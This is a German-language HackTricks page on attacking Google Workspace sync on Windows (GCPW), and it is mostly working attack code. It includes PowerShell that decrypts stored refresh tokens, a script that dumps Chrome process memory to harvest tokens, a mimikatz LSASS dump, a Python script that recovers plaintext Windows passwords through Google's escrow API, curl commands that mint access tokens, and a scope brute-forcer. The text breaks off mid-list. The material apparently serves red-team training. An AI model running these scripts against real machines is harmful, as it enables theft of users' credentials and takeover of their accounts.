# GWS - Workspace Sync Angriffe (GCPW, GCDS, Verzeichnis-Synchronisierung mit AD & EntraID)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## GCPW - Google Credential Provider f√ºr Windows

Dies ist die Single Sign-On-L√∂sung, die Google Workspaces bereitstellt, damit Benutzer sich mit **ihren Workspace-Anmeldeinformationen** an ihren Windows-PCs anmelden k√∂nnen. Dar√ºber hinaus werden Tokens zur Zugriff auf Google Workspace an einigen Stellen im PC gespeichert.

{% hint style="success" %}
Beachte, dass [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) in der Lage ist, **GCPW** zu erkennen, Informationen √ºber die Konfiguration zu erhalten und **sogar Tokens**.
{% endhint %}

### GCPW - MitM

Wenn ein Benutzer auf einen Windows-PC zugreift, der mit Google Workspace √ºber GCPW synchronisiert ist, muss er ein g√§ngiges Anmeldeformular ausf√ºllen. Dieses Anmeldeformular gibt einen OAuth-Code zur√ºck, den der PC gegen das Refresh-Token in einer Anfrage eintauschen wird:

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Neue Zeilen wurden hinzugef√ºgt, um die Lesbarkeit zu verbessern.

{% hint style="info" %}
Es war m√∂glich, einen MitM durch die Installation von `Proxifier` auf dem PC durchzuf√ºhren, indem die `utilman.exe`-Bin√§rdatei mit einer `cmd.exe` √ºberschrieben und die **Zug√§nglichkeitsfunktionen** auf der Windows-Anmeldeseite ausgef√ºhrt wurden, die eine **CMD** ausf√ºhrt, von der aus Sie **Proxifier starten und konfigurieren** k√∂nnen.\
Vergessen Sie nicht, den **QUICK UDP**-Verkehr in `Proxifier` zu blockieren, damit er auf TCP-Kommunikation herabgestuft wird und Sie ihn sehen k√∂nnen.

Konfigurieren Sie auch in "Dienste und andere Benutzer" beide Optionen und installieren Sie das Burp CA-Zertifikat in Windows.
{% endhint %}

Dar√ºber hinaus ist es m√∂glich, durch Hinzuf√ºgen der Schl√ºssel `enable_verbose_logging = 1` und `log_file_path = C:\Public\gcpw.log` in **`HKLM:\SOFTWARE\Google\GCPW`** einige Protokolle zu speichern.

### GCPW - Fingerabdruck

Es ist m√∂glich zu √ºberpr√ºfen, ob GCPW auf einem Ger√§t installiert ist, indem √ºberpr√ºft wird, ob der folgende Prozess existiert oder ob die folgenden Registrierungsschl√ºssel existieren:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`** ist es m√∂glich, die E-Mail des Benutzers und das verschl√ºsselte **refresh token** zuzugreifen, wenn sich der Benutzer k√ºrzlich angemeldet hat.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** ist es m√∂glich, die **Domains** zu finden, die sich im Schl√ºssel `domains_allowed` anmelden d√ºrfen, und in den Unterkeys sind Informationen √ºber den Benutzer wie E-Mail, Bild, Benutzername, Token-Lebensdauer, Token-Handle... zu finden.

{% hint style="info" %}
Das Token-Handle ist ein Token, das mit `eth.` beginnt und aus dem einige Informationen mit einer Anfrage extrahiert werden k√∂nnen, wie:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Es ist auch m√∂glich, den Token-Handle eines Zugriffstokens mit einer Anfrage wie dieser zu finden:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Soweit ich wei√ü, ist es nicht m√∂glich, ein Refresh-Token oder Access-Token aus dem Token-Handle zu erhalten.
{% endhint %}

Dar√ºber hinaus ist die Datei **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** ein JSON, das Informationen zu verschiedenen **Einstellungen** wie `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (ob mehrere Benutzer von Workspace sich am Computer anmelden k√∂nnen) und `validityPeriodDays` (Anzahl der Tage, an denen sich ein Benutzer nicht direkt bei Google neu authentifizieren muss) enth√§lt.

### GCPW - Registrierungs-Refresh-Token

Innerhalb der Registrierung **`HKCU:\SOFTWARE\Google\Accounts`** k√∂nnte es m√∂glich sein, einige Konten mit dem **`refresh_token`** zu finden, das darin verschl√ºsselt ist. Die Methode **`ProtectedData.Unprotect`** kann es leicht entschl√ºsseln.

<details>

<summary>Holen Sie sich <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> Daten und entschl√ºsseln Sie refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Beispielausgabe:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Wie in [**diesem Video**](https://www.youtube.com/watch?v=FEQxHRRP\_5I) erkl√§rt, wenn Sie das Token in der Registrierung nicht finden, ist es m√∂glich, den Wert zu √§ndern (oder zu l√∂schen) von **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** und beim n√§chsten Zugriff des Benutzers auf den Computer muss er sich erneut anmelden und das **Token wird in der vorherigen Registrierung gespeichert**.

### GCPW - Disk Refresh Tokens

Die Datei **`%LocalAppData%\Google\Chrome\User Data\Local State`** speichert den Schl√ºssel zum Entschl√ºsseln der **`refresh_tokens`**, die sich in den **Google Chrome-Profilen** des Benutzers befinden, wie:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Es ist m√∂glich, einige **C#-Code** zu finden, die auf diese Tokens in ihrer entschl√ºsselten Form in [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) zugreifen.

Dar√ºber hinaus kann die Verschl√ºsselung in diesem Code gefunden werden: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

Es kann beobachtet werden, dass AESGCM verwendet wird, das verschl√ºsselte Token beginnt mit einer **Version** (**`v10`** zu diesem Zeitpunkt), dann hat es [**12B Nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), und dann hat es den **Cipher-Text** mit einem finalen **MAC von 16B**.

### GCPW - Dumping tokens from processes memory

Das folgende Skript kann verwendet werden, um jeden **Chrome**-Prozess mit `procdump` zu **dumpen**, die **Strings** zu extrahieren und dann nach Strings zu suchen, die mit **Zugriffs- und Refresh-Token** zusammenh√§ngen. Wenn Chrome mit einer Google-Seite verbunden ist, wird ein **Prozess Refresh- und/oder Zugriffstoken im Speicher speichern!**

<details>

<summary>Dump Chrome-Prozesse und suche nach Tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

Ich habe dasselbe mit `gcpw_extension.exe` versucht, aber es wurde kein Token gefunden.

Aus irgendeinem Grund sind s**einige extrahierte Zugriffstoken nicht g√ºltig (obwohl einige g√ºltig sein werden)**. Ich habe das folgende Skript ausprobiert, um Zeichen 1 nach dem anderen zu entfernen, um zu versuchen, das g√ºltige Token aus dem Dump zu erhalten. Es hat mir nie geholfen, ein g√ºltiges zu finden, aber ich sch√§tze, es k√∂nnte:

<details>

<summary>Zugriffstoken √ºberpr√ºfen, indem Zeichen 1 nach dem anderen entfernt werden</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Wiederherstellung des Klartextpassworts

Um GCPW auszunutzen, um den Klartext des Passworts wiederherzustellen, ist es m√∂glich, das verschl√ºsselte Passwort aus **LSASS** mit **mimikatz** zu dumpen:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Dann suchen Sie nach dem Geheimnis wie `Chrome-GCPW-<sid>` wie im Bild:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Dann ist es mit einem **Zugriffstoken** mit dem Scope `https://www.google.com/accounts/OAuthLogin` m√∂glich, den privaten Schl√ºssel anzufordern, um das Passwort zu entschl√ºsseln:

<details>

<summary>Script zum Abrufen des Passworts im Klartext, gegeben das Zugriffstoken, das verschl√ºsselte Passwort und die Ressourcen-ID</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Es ist m√∂glich, die Schl√ºsselkomponenten davon im Chromium-Quellcode zu finden:

* API-Domain: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API-Endpunkt: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Zugriffstoken aus Aktualisierungstoken generieren

Mit dem Aktualisierungstoken ist es m√∂glich, Zugriffstoken zu generieren, indem es zusammen mit der Client-ID und dem Client-Geheimnis verwendet wird, die im folgenden Befehl angegeben sind:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
Beachten Sie, dass es selbst mit einem Refresh-Token nicht m√∂glich ist, einen beliebigen Scope f√ºr das Access-Token anzufordern, da Sie nur die **Scopes anfordern k√∂nnen, die von der Anwendung unterst√ºtzt werden, in der Sie das Access-Token generieren**.

Au√üerdem ist das Refresh-Token nicht in jeder Anwendung g√ºltig.
{% endhint %}

Standardm√§√üig hat GCPW nicht als Benutzer Zugriff auf jeden m√∂glichen OAuth-Scope. Mit dem folgenden Skript k√∂nnen wir die Scopes finden, die mit dem `refresh_token` verwendet werden k√∂nnen, um ein `access_token` zu generieren:

<details>

<summary>Bash-Skript zum Brute-Forcen von Scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Und dies ist die Ausgabe, die ich zum Zeitpunkt des Schreibens erhalten habe:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Dar√ºber hinaus ist es m√∂glich, im Chromium-Quellcode [**diese Datei zu finden**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), die **andere Scopes** enth√§lt, von denen angenommen werden kann, dass sie **nicht in der zuvor bruteforce-liste erscheinen**. Daher k√∂nnen diese zus√§tzlichen Scopes angenommen werden:

<details>

<summary>Zus√§tzliche Scopes</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Beachten Sie, dass das m√∂glicherweise das interessanteste ist:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Ich habe jedoch versucht, diesen Scope zu verwenden, um auf Gmail zuzugreifen oder Gruppen aufzulisten, und es hat nicht funktioniert, also wei√ü ich nicht, wie n√ºtzlich es noch ist.

**Holen Sie sich ein Zugriffstoken mit all diesen Scopes**:

<details>

<summary>Bash-Skript zum Generieren eines Zugriffstokens aus refresh_token mit allen Scopes</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
